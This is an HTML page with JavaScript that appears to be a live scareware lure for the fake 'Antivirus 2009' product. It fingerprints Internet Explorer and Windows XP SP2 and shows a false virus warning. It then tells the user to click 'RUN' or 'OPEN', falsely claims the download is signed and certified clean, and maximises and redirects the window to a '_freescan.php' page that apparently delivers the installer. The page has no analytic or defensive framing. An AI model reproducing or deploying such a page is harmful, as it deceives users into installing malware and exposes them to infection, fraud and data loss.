<html>
<body>
<script src='window.js'></script>
<script>
showwindow('x:'+window.screen.width/2+'; y:'+(window.screen.height/2-30), 'w:1; h:1'); 

is_XP_SP2     = (navigator.userAgent.indexOf("SV1") != -1) || (navigator.appMinorVersion && (navigator.appMinorVersion.indexOf('SP2') != -1));
  is_IE=false;
  if (navigator.appName.toLowerCase()=='microsoft internet explorer'){
    if (navigator.userAgent.toLowerCase().indexOf('opera')<=0)  { is_IE=true; }
  } 
  
if(confirm('ATTENTION! If your computer is struck by the virus, you could suffer data loss, erratic PC behaviour, PC freezes and creahes.\n\nDetect and remove viruses before they damage your computer!\nAntivirus 2009 will perform a 100% FREE and quick scan  of your computer for Viruses, Spyware and Adware.\n\nDo you want to install Antivirus 2009 to scan your computer for malware now? (Recommended)'))
{
  alert('Antivirus 2009 will scan your system for threats now.\n\nPlease select "RUN" or "OPEN" when prompted to start the installation.\n\nThis file has been digitally signed and independently certified as 100% free of spyware, adware and viruses.');
};

showwindow('x:0; y:0', 'w:' + window.screen.width + '; h:' + window.screen.height); 
window.resizeTo(window.screen.width, window.screen.height);

window.open('_freescan.php?id=880155', '_self');
window.focus();
</script>
</body>
</html>